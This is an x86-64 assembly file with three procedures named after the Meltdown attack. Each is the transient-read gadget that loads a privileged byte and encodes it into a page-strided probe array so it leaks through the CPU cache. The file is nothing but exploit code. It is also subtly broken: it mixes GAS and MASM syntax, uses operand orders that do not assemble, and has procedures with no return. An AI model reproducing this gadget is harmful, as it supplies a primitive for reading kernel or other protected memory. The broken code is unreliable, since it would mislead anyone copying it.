PUBLIC meltdown
PUBLIC meltdown_nonull
PUBLIC meltdown_fast

.code 

meltdown PROC
1:
	movq rsi, rsi
	movzx rax,rcx
	shl rax, 12
	jz 1b
	mov rbx, qword ptr[rbx+rax]
meltdown ENDP

meltdown_nonull PROC
1:                                                        
    movzx (rcx), rax                                        
    shl rax, 12                                            
    jz 1b
    mov rbx, qword ptr[rbx+rax]   
meltdown_nonull ENDP

meltdown_fast PROC
1:
	movzx (rcx), rax                                  
    shl rax, 12
    mov rbx, qword ptr[rbx+rax]
meltdown_fast ENDP

END
